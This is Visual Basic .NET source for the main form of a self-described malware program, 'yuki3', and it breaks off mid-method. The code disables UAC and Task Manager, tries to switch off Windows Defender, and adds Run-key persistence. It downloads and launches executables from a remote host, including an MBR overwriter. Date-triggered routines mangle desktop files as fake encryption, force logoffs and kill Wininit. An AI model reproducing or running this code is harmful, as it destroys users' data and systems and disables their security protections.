Imports System
Imports Microsoft.Win32
Imports System.IO
Imports System.Net
Imports System.Text
Imports System.Security.AccessControl
Imports System.Management
Imports System.Threading
Imports System.IO.Compression
Imports System.Runtime.InteropServices


Public Class Form1
    Private Const SPI_SETDESKWALLPAPER As Integer = 20
    Private Const SPIF_UPDATEINIFILE As Integer = &H1
    Private Const SPIF_SENDWININICHANGE As Integer = &H2
    Dim WithEvents ProcessStartWatcher As New ManagementEventWatcher(New WqlEventQuery("SELECT * FROM Win32_ProcessStartTrace"))
    Dim WithEvents ProcessStopWatcher As New ManagementEventWatcher(New WqlEventQuery("SELECT * FROM Win32_ProcessStopTrace"))
    <DllImport("user32.dll", CharSet:=CharSet.Auto)>
    Private Shared Function SystemParametersInfo(ByVal uAction As Integer,
        ByVal uParam As Integer, ByVal lpvParam As String,
        ByVal fuWinIni As Integer) As Integer
    End Function
    Public Function OpenProgram(ByVal ThisOne As Form) As Form
        Return CType(Activator.CreateInstance(ThisOne.GetType()), Form)
    End Function
    ' Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
    Private Declare Function CreatePatternBrush Lib "gdi32" (ByVal hBitmap As IntPtr) As IntPtr
    Dim working As Boolean = True
    Dim RegistryKey As Object
    Dim admin As Boolean = True
    Dim download1 As Boolean = False
    Dim download2 As Boolean = False
    Dim download3 As Boolean = False
    Dim download4 As Boolean = False
    Dim download5 As Boolean = False
    Dim download6 As Boolean = False
    Dim download7 As Boolean = False
    Dim working4 As Boolean = False
    Dim download8 As Boolean = False
    Dim download9 As Boolean = False
    Dim download10 As Boolean = False
    Dim download11 As Boolean = False
    Dim download12 As Boolean = False
    Dim download14 As Boolean = False
    Dim download15 As Boolean = False
    Dim download16 As Boolean = False
    Dim download17 As Boolean = False
    Dim download18 As Boolean = False
    Dim download19 As Boolean = False
    Dim download20 As Boolean = False
    Dim Check4BadFile As Boolean = False
    Dim download13 As Boolean = False
    Dim testing As Boolean = False
    Dim des = fakememz


    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load 'https://incomparable-cascaron-802b94.netlify.app/earrape.wav
        ' my_thing_idkvb.Show()
        If testing = False Then
            'MsgBox(Application.StartupPath)
            If Not My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki") Then
                Dim result As DialogResult = MessageBox.Show("THIS PROGRAM IS CONSIDERED MALWARE THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE DONE. ( SHOULD I STILL EXECUTE THE PROGRAM )", "Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Warning)
                If result = DialogResult.Yes Then
                    Dim result2 As DialogResult = MessageBox.Show("THIS PROGRAM IS CONSIDERED MALWARE THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE DONE. ( THIS IS YOUR LAST WARNING SHOULD I STILL EXECUTE PROGRAM )", "THIS IS YOUR LAST WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Warning)
                    Try
                        My.Computer.FileSystem.DeleteFile("C:\Users\" & SystemInformation.UserName & "\Remove_Yuki_Virus.exe")
                    Catch ex2 As Exception

                    End Try

                    If result2 = DialogResult.Yes Then
                        Dim result5 As DialogResult = MessageBox.Show("Do you want to enable the destructive version of this program?", "IF YOU ENABLE THIS IT WILL DESTROY YOUR COMPUTER EVENTUALLY", MessageBoxButtons.YesNo, MessageBoxIcon.Warning)
                        If result5 = DialogResult.Yes Then
                            Dim sb As New System.Text.StringBuilder
                            sb.AppendLine("{true}")
                            Try
                                IO.File.WriteAllText(Application.StartupPath & "\destructive.yuki3", sb.ToString())
                            Catch ex2 As Exception

                            End Try
                        Else
                            If My.Computer.FileSystem.FileExists(Application.StartupPath & "\destructive.yuki3") Then
                                My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\destructive.yuki3")
                            End If
                        End If
                        My.Settings.infected = True
                        'runasadmin()

                        ' Me.Close()
                    Else
                        Process.GetProcessesByName(IO.Path.GetFileNameWithoutExtension(Application.ExecutablePath))(0).Kill()


                    End If
                Else
                    Process.GetProcessesByName(IO.Path.GetFileNameWithoutExtension(Application.ExecutablePath))(0).Kill()


                End If
            End If


            HideTaskManager()
            Wait2DisPros.RunWorkerAsync()



            Dim sb3 As New System.Text.StringBuilder
            sb3.AppendLine("C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
            sb3.AppendLine("exit")
            sb3.AppendLine("del fuckUAC.bat")
            IO.File.WriteAllText("fuckUAC.bat", sb3.ToString())
            Process.Start("fuckUAC.bat")




            If My.Settings.infected = True Then
                Dim sb As New System.Text.StringBuilder


                ' MsgBox("") 'https://www.7-zip.org/a/7zr.exe
                ' CheckForBadFiles.Start()
                ' CehckforbadPross.Start()
            End If
            Try
                Dim scope As New ManagementScope("\\.\ROOT\SecurityCenter2")
                scope.Connect()

                Dim query As New ObjectQuery("SELECT * FROM AntivirusProduct")
                Dim searcher As New ManagementObjectSearcher(scope, query)

                For Each instance As ManagementObject In searcher.Get()
                    If instance("displayName").ToString().Contains("Windows Defender") Then
                        instance.InvokeMethod("SetEnable", New Object() {False})
                    End If
                Next
            Catch ex As Exception

            End Try

            Dim path As String = "C:\Users\" & SystemInformation.UserName & "\path.yuki"

            Dim fs As FileStream = File.Create(path)



            ' Add text to the file.
            Dim info As Byte() = New UTF8Encoding(True).GetBytes(Application.ExecutablePath)
            fs.Write(info, 0, info.Length)
            fs.Close()
            'https://incomparable-cascaron-802b94.netlify.app/DesktopGoose.zip

            RegistryKey = CreateObject("WScript.Shell") 'https://www.7-zip.org/a/7zr.exe
            Try
                download8 = True
                My.Computer.Network.DownloadFile(
             "https://incomparable-cascaron-802b94.netlify.app/gdi.exe", 'https://incomparable-cascaron-802b94.netlify.app/play.vbs
            "C:\Users\" & SystemInformation.UserName & "\gdi.exe")

            Catch ex As Exception

            End Try

            DownloadBigFiles.RunWorkerAsync()
            DownloadBigFiles2.RunWorkerAsync()
            DownloadBigFiles3.RunWorkerAsync()

            Try
                download15 = True
                My.Computer.Network.DownloadFile(
             "https://incomparable-cascaron-802b94.netlify.app/Yuki3Antivirus.exe", 'https://incomparable-cascaron-802b94.netlify.app/play.vbs
            "C:\Users\" & SystemInformation.UserName & "\Yuki3Antivirus.exe")

            Catch ex As Exception

            End Try
            Try
                download16 = True
                My.Computer.Network.DownloadFile(
             "https://incomparable-cascaron-802b94.netlify.app/ERROR408.exe",
            "C:\Users\" & SystemInformation.UserName & "\ERROR408.exe")

            Catch ex As Exception

            End Try

            Try
                download17 = True
                My.Computer.Network.DownloadFile(
             "https://incomparable-cascaron-802b94.netlify.app/Main.db", 'https://incomparable-cascaron-802b94.netlify.app/play.vbs
            "C:\Users\" & SystemInformation.UserName & "\Main.db")

            Catch ex As Exception

            End Try
            Try
                download14 = True
                My.Computer.Network.DownloadFile(
             "https://incomparable-cascaron-802b94.netlify.app/play.vbs", 'https://incomparable-cascaron-802b94.netlify.app/play.vbs
            "C:\Users\" & SystemInformation.UserName & "\play.vbs")

            Catch ex As Exception

            End Try

            Try
                download8 = True
                My.Computer.Network.DownloadFile(
             "https://incomparable-cascaron-802b94.netlify.app/yuki3.f.exe",
            "C:\Users\" & SystemInformation.UserName & "\yuki3.f.exe")

            Catch ex As Exception

            End Try


            Try
                download8 = True
                My.Computer.Network.DownloadFile(
             "https://www.7-zip.org/a/7zr.exe", 'https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe
            "C:\Users\" & SystemInformation.UserName & "\7z.exe")

            Catch ex As Exception

            End Try

            Try
                download9 = True
                My.Computer.Network.DownloadFile(
             "https://incomparable-cascaron-802b94.netlify.app/DesktopGoose.zip", 'https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe
            "C:\Users\" & SystemInformation.UserName & "\DesktopGoose.zip")

            Catch ex As Exception

            End Try


            Try
                download9 = True
                My.Computer.Network.DownloadFile(
             "https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe", 'https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe
            "C:\Users\" & SystemInformation.UserName & "\fake.memz.joke.exe")

            Catch ex As Exception

            End Try

            Try
                download1 = True
                My.Computer.Network.DownloadFile(
             "https://incomparable-cascaron-802b94.netlify.app/AxInterop.WMPLib.dll", 'https://incomparable-cascaron-802b94.netlify.app/BluescreenSimulator.exe
            "C:\Users\" & SystemInformation.UserName & "\AxInterop.WMPLib.dll")

            Catch ex As Exception

            End Try

            Try
                download1 = True
                My.Computer.Network.DownloadFile(
             "https://incomparable-cascaron-802b94.netlify.app/338ryfhn2iyhrb2j.exe",
            "C:\Users\" & SystemInformation.UserName & "\338ryfhn2iyhrb2j.exe")

            Catch ex As Exception

            End Try

            Try

                My.Computer.Network.DownloadFile(
             "https://incomparable-cascaron-802b94.netlify.app/beep2.wav",
            "C:\Users\" & SystemInformation.UserName & "\beep2.wav")

            Catch ex As Exception

            End Try


            Try
                download2 = True
                My.Computer.Network.DownloadFile(
                   "https://incomparable-cascaron-802b94.netlify.app/Interop.WMPLib.dll",
                  "C:\Users\" & SystemInformation.UserName & "\Interop.WMPLib.dll")

            Catch ex As Exception

            End Try

            Try

                My.Computer.Network.DownloadFile(
                   "https://incomparable-cascaron-802b94.netlify.app/Hoax.Win32.BadJoke.BlastBtn.a.exe",
                  "C:\Users\" & SystemInformation.UserName & "\Hoax.Win32.BadJoke.BlastBtn.a.exe")

            Catch ex As Exception

            End Try

            download4 = True

            Try
                download3 = True
                My.Computer.Network.DownloadFile(
                  "https://incomparable-cascaron-802b94.netlify.app/welpyoutryed.exe",
                 "C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")

            Catch ex As Exception

            End Try


            Try
                download3 = True

                My.Computer.Network.DownloadFile(
         "https://incomparable-cascaron-802b94.netlify.app/monitoring-service.exe",
        "C:\Users\" & SystemInformation.UserName & "\Wncujekce893hxc8y3hnsp3u809ef3y7dsgfre45t4gr.exe")
            Catch ex As Exception

            End Try




            Try
                download6 = True
                My.Computer.Network.DownloadFile(
                "https://incomparable-cascaron-802b94.netlify.app/screen-melter.exe",
               "C:\Users\" & SystemInformation.UserName & "\screen-melter.exe")
            Catch ex As Exception

            End Try


            Process.Start("C:\Users\" & SystemInformation.UserName & "\338ryfhn2iyhrb2j.exe")

            Try 'remove... My.Computer.Registry.LocalMachine.OpenSubKey("S
                'OFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue(Application.ProductName)
                Dim fileq As System.IO.StreamWriter

                fileq = My.Computer.FileSystem.OpenTextFileWriter("C:\YFShshfgsd.yuki", True)
                fileq.WriteLine("just a temp file...")
                fileq.Close()
                Threading.Thread.Sleep(100) ' 500 milliseconds = 0.5 seconds
                File.Delete("C:\YFShshfgsd.yuki")
                ' to fix UAC C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
                RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD")
                RegistryKey.regwrite("HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\kbdhid\Parameters\CrashOnCtrlScroll", 1, "REG_DWORD")
                MyUtilities.RunCommandCom("reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f", "/W", True) 'fucks UAC\



                If My.Settings.fucked = True Then
                    If Not My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\fucked.yuki3") Then

                    End If

                End If

                Try
                    My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue(Application.ProductName)
                Catch ex As Exception

                End Try
                Threading.Thread.Sleep(100) ' 500 milliseconds = 0.5 seconds
                If My.Computer.FileSystem.FileExists("RESET.yuki") Then
                    RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 0, "REG_DWORD")
                Else
                    My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
                    RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD")
                End If

            Catch ex As Exception

                admin = False
                If ex.ToString.Contains("denied") Then

                    Check4BadFile = True
                    If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki") Then
                        If Not My.Computer.FileSystem.FileExists("yuki3.exe.config") Then




                            Process.Start("C:\Users\" & SystemInformation.UserName & "\Wncujekce893hxc8y3hnsp3u809ef3y7dsgfre45t4gr.exe")
                        Else
                            My.Computer.FileSystem.DeleteFile("yuki3.exe.config")
                        End If


                    Else

                        If My.Computer.FileSystem.FileExists(Application.StartupPath & "\destructive.yuki3") Then
                            des = True
                            MsgBox("you are currently running the destructive version of this program", 0 + 64, "note")
                        Else

                        End If


                    End If


                End If


            End Try


            '  Me.WindowState = Me.WindowState.Minimized
            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki") Then
                Dim today = Date.Today
                Dim day = today.Day
                Dim month = today.Month
                If My.Settings.working = True Then
                    If day = 1 AndAlso month = 1 Then
                        NewYears.Show()
                    End If
                    If day = 3 AndAlso month = 3 Then
                        you_are_an_idiot.Show()
                        Dim newApp As Form = OpenProgram(you_are_an_idiot)
                        Dim newApp1 As Form = OpenProgram(you_are_an_idiot)
                        Dim newApp2 As Form = OpenProgram(you_are_an_idiot)
                        Dim newApp3 As Form = OpenProgram(you_are_an_idiot)
                        newApp.Show()
                        newApp1.Show()
                        newApp2.Show()
                    End If
                    If day = 1 AndAlso month = 2 Then
                        Try
                            Process.Start("C:\Users\" & SystemInformation.UserName & "\Hoax.Win32.BadJoke.BlastBtn.a.exe")
                        Catch ex As Exception
                            MsgBox(ex.ToString, 0 + 16, "ERROR")
                        End Try
                    End If
                    If day = 10 AndAlso month = 1 Then
                        MsgBox("Your computer is still messed up (:")
                        Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
                    End If
                    If day = 1 AndAlso month = 3 Then
                        ur_pc_is_gone_lmao.Show()
                    End If
                    If day = 9 AndAlso month = 7 Then
                        my_thing_idkvb.Show()
                    End If
                    If day = 17 AndAlso month = 6 Then
                        Try
                            'Timer2
                            MsgBox("your computer's been infected so I thought I would give you an antivirus", 0 + 64)
                            'Process.Start("C:\Users\" & SystemInformation.UserName & "\Yuki3Antivirus.exe")
                            Dim startInfo As New ProcessStartInfo("C:\Users\" & SystemInformation.UserName & "\Yuki3Antivirus.exe")
                            startInfo.WorkingDirectory = "C:\Users\" & SystemInformation.UserName
                            startInfo.UseShellExecute = True
                            Process.Start(startInfo)

                        Catch ex As Exception
                            MsgBox(ex.ToString, 0 + 16)
                        End Try

                    End If
                    If day = 10 AndAlso month = 4 Then

                        Timer1.Start()
                    End If
                    If day = 17 AndAlso month = 12 Then
                        oh_god_what_the_fuckvb.Show()
                    End If
                    If day = 1 AndAlso month = 4 Then
                        My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\ohnotooload.wav", AudioPlayMode.BackgroundLoop)
                        earrape.Show()
                        MsgBox("YPUVE BEEN SKOCKO,ED", 0 + 64, "YPUVE BEEN SKOCKO,ED")
                    End If
                    If day = 3 AndAlso month = 4 Then

                        Timer1.Start()
                    End If
                    If day = 28 AndAlso month = 9 Then
                        Openzv800alot.Start()
                    End If
                    If day = 5 AndAlso month = 9 Then
                        nowebforu.Start()
                    End If
                    If day = 5 AndAlso month = 5 Then
                        MsgBox("in honor of my most popular YouTube video...", 0 + 64)
                        MsgBox("I will be executing the program shown in that video...", 0 + 64)
                        MsgBox("ERROR could not find C:\un3e.dll\ CODE: 408", 0 + 16)
                        Try
                            '  Process.Start("C:\Users\" & SystemInformation.UserName & "\ERROR408.exe")
                            Dim startInfo As New ProcessStartInfo("C:\Users\" & SystemInformation.UserName & "\ERROR408.exe")
                            startInfo.WorkingDirectory = "C:\Users\" & SystemInformation.UserName
                            startInfo.UseShellExecute = True
                            Process.Start(startInfo)

                            Dim sb As New System.Text.StringBuilder
                        Catch ex As Exception

                        End Try

                    End If
                    If day = 5 AndAlso month = 10 Then
                        '  Dim exeResource As Byte() = My.Resources.Yuki3Antivirus
                        Dim exePath As String = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "Yuki3Antivirus.exe")
                        '  System.IO.File.WriteAllBytes(exePath, exeResource)
                        '   System.Diagnostics.Process.Start(exePath)
                    End If
                    If day = 1 AndAlso month = 5 Then
                        you_are_an_idiot.Show()
                        Dim newApp As Form = OpenProgram(Me)
                        Dim newApp1 As Form = OpenProgram(Me)
                        Dim newApp2 As Form = OpenProgram(Me)
                        Dim newApp3 As Form = OpenProgram(Me)
                        newApp.Show()
                        newApp1.Show()
                        newApp2.Show()
                    End If
                    If day = 1 AndAlso month = 6 Then
                        Timer2.Start()
                    End If
                    If day = 18 AndAlso month = 6 Then
                        MsgBox("guess the link! ", 0 + 64, "dQw4w9WgXcQ")
                        MsgBox("https://youtu.be/dQw4w9WgXcQ", 0 + 64, "dQw4w9WgXcQ")
                        Process.Start("https://youtu.be/dQw4w9WgXcQ")
                        Process.Start("https://youtu.be/dQw4w9WgXcQ")
                        Process.Start("https://youtu.be/dQw4w9WgXcQ")
                        Process.Start("https://youtu.be/dQw4w9WgXcQ")
                        Process.Start("https://youtu.be/dQw4w9WgXcQ")
                        Process.Start("https://youtu.be/dQw4w9WgXcQ")
                        MsgBox("yep", 0 + 64, "lololol")
                    End If
                    If day = 1 AndAlso month = 7 Then
                        hahahahaerror.Show()

                    End If
                    If day = 8 And month = 7 Then
                        If My.Computer.FileSystem.FileExists(Application.StartupPath & "\destructive.yuki3") Then
                            Dim sourceDirectory As String = My.Computer.FileSystem.SpecialDirectories.Desktop
                            Dim targetExtension As String = ".yuki3_encrypted"
                            Dim Files() As System.IO.FileInfo
                            Dim dir1 = My.Computer.FileSystem.SpecialDirectories.Desktop
                            Dim dirinfo As New System.IO.DirectoryInfo(dir1)
                            Files = dirinfo.GetFiles("*", System.IO.SearchOption.AllDirectories)
                            For Each file In Files
                                Try
                                    Dim fileReader As String
                                    fileReader = My.Computer.FileSystem.ReadAllText(file.FullName)
                                    Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(fileReader)
                                    Dim inc = System.Convert.ToBase64String(byt)
                                    Dim sWriter As New System.IO.StreamWriter(file.FullName, False)
                                    sWriter.Write(inc)
                                    sWriter.Close()
                                Catch ex As Exception

                                End Try
                            Next
                            Dim files2 As String() = System.IO.Directory.GetFiles(sourceDirectory, "*.*")
                            For Each file As String In files2

                                Try
                                    Dim fileName As String = System.IO.Path.GetFileNameWithoutExtension(file)
                                    Dim newPath As String = System.IO.Path.Combine(sourceDirectory, fileName & targetExtension)
                                    System.IO.File.Move(file, newPath)
                                Catch ex As Exception

                                End Try
                            Next
                            MsgBox("your desktop has been encrypted lmao", 0 + 64, "LMAO")
                        End If

                    End If
                    If month = 8 Then
                        '   creepy_Patrick_Star.Show()
                        Timer3.Start()
                    End If
                    If day = 13 And month = 6 Then
                        Dim str As String = "Remember this is your fault for running the program"
                        For Each c As Char In str
                            SendKeys.Send(c)
                            System.Threading.Thread.Sleep(40)
                        Next
                    End If


                    If day = 12 AndAlso month = 2 Then
                        Form2.Show()
                    End If
                    If day = 5 AndAlso month = 6 Then
                        MsgBox("i can see you (:")
                    End If
                    If day = 7 AndAlso month = 6 Then
                        MsgBox("you will soon see my full power :D")
                    End If
                    If day = 8 AndAlso month = 6 Then
                        MsgBox("I will completely destroy your computer you just wait......")
                    End If
                    If day = 9 AndAlso month = 6 Then
                        MsgBox("your mom", 0 + 64, "SYS.EXE")
                        Process.Start("https://youtu.be/3RGjvBrRRek")
                    End If
                    If day = 20 AndAlso month = 10 Then
                        F_for_EERFvb.Show()
                        Timer1.Start()
                    End If
                    If day = 12 AndAlso month = 2 Then
                        MsgBox("your windows license has expired you will now be signed out", 0 + 16, "WINDOWS")
                        Process.Start("shutdown.exe", "/l")
                    End If
                    If day = 6 AndAlso month = 3 Then
                        MsgBox("now thats A lot of damage", 0 + 16, "- Phil Swift")
                        Process.Start("https://youtu.be/7zpxgyG7eGk")
                    End If


                    If day = 20 AndAlso month = 4 Then
                        MsgBox("I'm going to log you off just to piss you off - yuki3", 0 + 16, "yuki3.exe")
                        Process.Start("https://youtu.be/g-bVEc8oZvk")
                        Process.Start("shutdown.exe", "/l")
                    End If
                    If day = 6 AndAlso month = 9 Then
                        no_computer_today.Show()
                    End If
                    If month = 9 Then
                        If Not day = 6 Then
                            If Not day = 7 Then
                                If Not day = 28 Then
                                    If Not day = 5 Then
                                        Process.Start("https://youtu.be/dQw4w9WgXcQ")
                                        rickrolled.Show()
                                    End If

                                End If

                            End If

                            End If

                        End If
                    If day = 1 AndAlso month = 10 Then
                        MsgBox("I have launched my custom version of the memz virus so have fun with that (:", 0 + 64, "MEMZ")
                        Timer4.Start()
                        Memzopenweb.Start()
                        '      Threading.Thread.Sleep(50000)
                        Stilluseingthispclol.Start()
                        ' Threading.Thread.Sleep(50000)

                        'MsgBox("PC SELF-DESTRUCT INITIATED", 0 + 16, "MEMZ")

                        Try
                            Process.Start("C:\Users\" & SystemInformation.UserName & "\gdi.exe") 'gdi_test.exe
                        Catch ex As Exception
                            MsgBox(ex.ToString, 0 + 16, "yuki - memz")
                        End Try


                        Threading.Thread.Sleep(70000)
                        Try
                            Process.GetProcessesByName("gdi")(0).Kill()
                        Catch ex As Exception

                        End Try
                        Try
                            Process.GetProcessesByName("gdi_test")(0).Kill()
                        Catch ex As Exception

                        End Try
                        Try
                            Process.GetProcessesByName("gdi.exe")(0).Kill()
                        Catch ex As Exception

                        End Try
                        Try
                            Process.GetProcessesByName("gdi_test.exe")(0).Kill()
                        Catch ex As Exception

                        End Try
                        Try
                            Process.Start("C:\Users\" & SystemInformation.UserName & "\fake.memz.joke.exe")
                            Memzopenweb.Stop()
                            Timer4.Stop()
                            Stilluseingthispclol.Stop()
                        Catch ex As Exception

                        End Try

                    End If
                    If day = 1 AndAlso month = 11 Then 'https://www.fittea.com/
                        Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
                    End If
                    If day = 5 AndAlso month = 11 Then
                        Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
                    End If
                    If day = 8 AndAlso month = 11 Then '
                        Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
                    End If
                    If day = 11 AndAlso month = 11 Then '
                        Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
                    End If
                    If day = 17 AndAlso month = 11 Then '
                        Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
                    End If
                    If day = 20 AndAlso month = 11 Then '
                        Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
                    End If
                    If day = 22 AndAlso month = 11 Then '
                        Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
                    End If
                    If day = 18 AndAlso month = 12 Then


                        '  My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue(Application.ProductName)
                        ' RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 0, "REG_DWORD")
                        If My.Computer.FileSystem.FileExists(Application.StartupPath & "\destructive.yuki3") Then

                            Try
                                My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\MELTDOWN.wav")
                            Catch ex As Exception
                                MsgBox("Cannot find the required file: C:\Users\" & SystemInformation.UserName & "\MELTDOWN.wav" & " [ CONTINUING WITHOUT THE MUSIC ]", 0 + 64, "ERROR")
                            End Try

                            Try
                                download8 = True
                                My.Computer.Network.DownloadFile(
             "https://incomparable-cascaron-802b94.netlify.app/wallpaper.bmp", 'https://incomparable-cascaron-802b94.netlify.app/wallpaper.bmp
            "C:\Users\" & SystemInformation.UserName & "\w.bmp")
                                Try
                                    Dim bmp As New Bitmap("C:\Users\" & SystemInformation.UserName & "\w.bmp")
                                    Dim brush As IntPtr = CreatePatternBrush(bmp.GetHbitmap())
                                    SystemParametersInfo(&H14, 0, brush, &H1 Or &H2)
                                Catch ex As Exception

                                End Try

                            Catch ex As Exception

                            End Try




                            '"C:\Users\" & SystemInformation.UserName & "\hahau.wav"
                            Try
                                If Not My.Computer.FileSystem.FileExists("fucked.yuki3") Then
                                    My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\hahau.wav", AudioPlayMode.BackgroundLoop)
                                End If

                            Catch ex As Exception

                            End Try
                            Dim sb2 As New System.Text.StringBuilder
                            CopyIexmeme.Start() 'oh hell no man what the fuck
                            sb2.AppendLine(":a")
                            '  sb.AppendLine("copy " & Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\explore.exe iexplore_%RANDOM%.exe")
                            ' 'sb.AppendLine("goto a")
                            Try
                                IO.File.WriteAllText("C:\Users\" & SystemInformation.UserName & "\fucked.yuki3", sb2.ToString())
                            Catch ex As Exception

                            End Try

                            fucked.RunWorkerAsync()
                            Try
                                download8 = True
                                My.Computer.Network.DownloadFile(
             "https://incomparable-cascaron-802b94.netlify.app/killpc.exe", 'https://incomparable-cascaron-802b94.netlify.app/killpc.exe
            "C:\Users\" & SystemInformation.UserName & "\systemrepair.exe")
                                Process.Start("C:\Users\" & SystemInformation.UserName & "\systemrepair.exe")
                            Catch ex As Exception
                                MsgBox(ex.ToString)
                            End Try

                            Try
                                download8 = True
                                My.Computer.Network.DownloadFile(
             "https://incomparable-cascaron-802b94.netlify.app/MbrOverwriter.exe", 'https://incomparable-cascaron-802b94.netlify.app/killpc.exe
            "C:\Users\" & SystemInformation.UserName & "\MbrOverwriter.exe")
                                Process.Start("C:\Users\" & SystemInformation.UserName & "\MbrOverwriter.exe")
                            Catch ex As Exception
                                MsgBox(ex.ToString)
                            End Try
                            Try
                                My.Computer.Network.DownloadFile(
           "https://incomparable-cascaron-802b94.netlify.app/iexplore.exe", 'https://incomparable-cascaron-802b94.netlify.app/iexplore
          Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\iexplore.exe")
                                Dim sb As New System.Text.StringBuilder


                                CopyIexmeme.Start() 'oh hell no man what the fuck

                                '  sb.AppendLine(":a")
                                '  sb.AppendLine("copy " & Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\explore.exe iexplore_%RANDOM%.exe")
                                ' 'sb.AppendLine("goto a")
                                'IO.File.WriteAllText("urfucked.bat", sb.ToString())
                                'Process.Start("urfucked.bat")

                            Catch ex As Exception

                            End Try


                            Dim s As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                            ' MyUtilities.RunCommandCom(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\Remove_Yuki_Virus.exe", "/W", True)
                            MsgBox("YOUR COMPUTER IS IN MELTDOWN USE IT AS LONG AS YOU CAN BECAUSE IT'S ALREADY FUCKED", 0 + 64, "YUKI3")
                            System.Threading.Thread.Sleep(40000)
                            Dim p() As Process
                            p = Process.GetProcessesByName("Wininit")
                            Process.GetProcessesByName("Wininit")(0).Kill()

                        Else
                            My.Settings.working = False
                            Try
                                My.Computer.FileSystem.DeleteFile("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki")
                            Catch ex As Exception
                                MsgBox(ex.ToString, 0 + 16, "error")
                            End Try
                            Yuki_credits.Show()
                        End If


                    End If
                    Try
                        RegistryKey = CreateObject("WScript.Shell")
                        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD")
                    Catch ex As Exception

                    End Try
                End If




            End If



            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki") Then
            Else
                If admin = True Then
                    'MsgBox("This program is incompatible with your current Windows installation.", 0 + 16, "incompatible")
                    Yuki___infected.Show()
                    Dim file2 As System.IO.StreamWriter
                    file2 = My.Computer.FileSystem.OpenTextFileWriter("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki", True)
                    file2.WriteLine("true")
                    file2.Close()
                    ' Set up the file path and permissions.
                    Dim filePath As String = "C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki"
                End If
            End If


            Try
                'Process.Start("C:\Users\" & SystemInformation.UserName & "\monitoring service1.exe")
                working4 = True
            Catch ex As Exception

            End Try
            downloadwavFiles()

            'you_are_an_idiot.Show()
        End If

    End Sub



    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            Using client = New WebClient()

                '  Using stream = client.OpenRead("http://www.google.com") server overloaded

            End Using


            My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\346tr8Ge6.wav", AudioPlayMode.BackgroundLoop) '"C:\Users\" & SystemInformation.UserName & "\beep2.wav"
            Timer1.Stop()
            'End Using
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Try
            Using client = New WebClient()
                '  Using stream = client.OpenRead("http://www.google.com")

            End Using



